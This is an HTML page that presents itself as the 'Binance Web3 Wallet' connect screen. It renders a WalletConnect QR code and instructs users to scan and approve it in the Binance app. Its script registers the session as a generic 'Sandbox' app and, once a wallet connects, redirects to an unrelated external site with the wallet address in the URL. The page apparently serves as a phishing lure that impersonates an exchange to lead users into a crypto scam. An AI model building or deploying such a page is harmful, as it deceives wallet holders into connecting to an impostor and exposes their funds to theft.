<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance Web3 Wallet - Connect</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: #16161a;
            border-radius: 16px;
            padding: 40px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }
        h1 { font-size: 1.5rem; margin-bottom: 8px; color: #f0b90b; text-align: center; }
        .subtitle { color: #888; text-align: center; margin-bottom: 24px; font-size: 0.9rem; }
        #status {
            text-align: center; padding: 12px;
            background: #1e1e1e; border-radius: 8px; margin: 12px 0; font-size: 0.9rem;
            word-break: break-word;
        }
        #status.error { background: #3d0a0a; border: 1px solid #e74c3c; }
        #status.connected { background: #0a3d0a; border: 1px solid #2ecc71; }
        #qr-box {
            background: #fff;
            border-radius: 12px;
            padding: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 280px;
            margin: 16px 0;
        }
        #qr-box canvas, #qr-box img { border-radius: 8px; }
        .info {
            margin-top: 16px; padding: 12px; background: #1e1e1e;
            border-radius: 8px; font-size: 0.8rem; color: #888;
        }
        .info p { margin: 4px 0; }
        .info strong { color: #f0b90b; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Binance Web3 Wallet</h1>
        <p class="subtitle">Scan QR to Connect</p>

        <div id="status">Loading...</div>
        <div id="qr-box"></div>

        <div class="info">
            <p><strong>Steps:</strong></p>
            <p>1. Open Binance App</p>
            <p>2. Web3 Wallet tab</p>
            <p>3. Tap scan icon (top right)</p>
            <p>4. Scan the QR code above</p>
            <p>5. Approve in Binance</p>
        </div>
    </div>

    <!-- QRious: small, reliable QR library -->
    <script src="https://cdn.jsdelivr.net/npm/qrious@4.0.2/dist/qrious.min.js"></script>

    <script>
        const statusDiv = document.getElementById('status');
        const qrBox = document.getElementById('qr-box');
        const PROJECT_ID = '4689db3295784d6a806b30b4975c8faa';

        function setStatus(text, cls) {
            statusDiv.textContent = text;
            statusDiv.className = cls || '';
        }

        function renderQR(uri) {
            setStatus('Scan this QR with Binance Web3 Wallet');
            qrBox.innerHTML = '';
            const canvas = document.createElement('canvas');
            qrBox.appendChild(canvas);
            new QRious({
                element: canvas,
                value: uri,
                size: 320,
                level: 'H'
            });
        }

        async function connect() {
            try {
                setStatus('Loading libraries...');
                const mod = await import('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.2/+esm');
                const EthereumProvider = mod.EthereumProvider || mod.default;

                setStatus('Initializing...');
                const provider = await EthereumProvider.init({
                    projectId: PROJECT_ID,
                    chains: [56],
                    optionalChains: [1, 137, 42161],
                    showQrModal: false,
                    metadata: {
                        name: 'Sandbox',
                        description: 'Test',
                        url: window.location.origin,
                        icons: []
                    }
                });

                provider.on('display_uri', (uri) => {
                    console.log('WC URI:', uri);
                    renderQR(uri);
                });

                provider.on('connect', (accounts) => {
                    const addr = accounts?.accounts?.[0] || accounts?.[0] || '';
                    setStatus('✅ Connected! Redirecting...', 'connected');
                    qrBox.innerHTML = '';
                    // Redirect to dApp with wallet address
                    setTimeout(() => {
                        window.location.href = 'https://type-usdt-amount.vercel.app/?wallet=' + addr;
                    }, 1500);
                });

                provider.on('disconnect', () => {
                    setStatus('Disconnected. Refresh to reconnect.');
                });

                setStatus('Connecting...');
                await provider.enable();

            } catch (error) {
                console.error(error);
                setStatus('Error: ' + error.message, 'error');
            }
        }

        connect();
    </script>
</body>
</html>
